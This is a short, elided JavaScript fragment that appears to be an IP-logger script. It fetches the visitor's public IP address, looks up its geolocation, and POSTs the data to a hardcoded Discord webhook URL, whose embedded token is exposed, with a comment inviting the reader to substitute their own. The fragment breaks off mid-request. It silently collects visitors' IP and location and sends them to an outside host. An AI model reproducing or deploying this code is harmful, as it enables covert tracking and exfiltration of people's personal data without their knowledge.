    ...
    fetch('https://api.ipify.org?format=json')
        ...
        .then(ipData => {
            ...
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                ...
                .then(geoData => {
                    const dscURL = 'https://ptb.discord.com/api/webhooks/1396851989802909706/rMtZxiobPRou0gkrOJOpcmCajDzJdYFY3ICJApt5qFOsE6b1DoBdK-L1-xHRsrb-qNVW'; // replace with your webhook url
                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
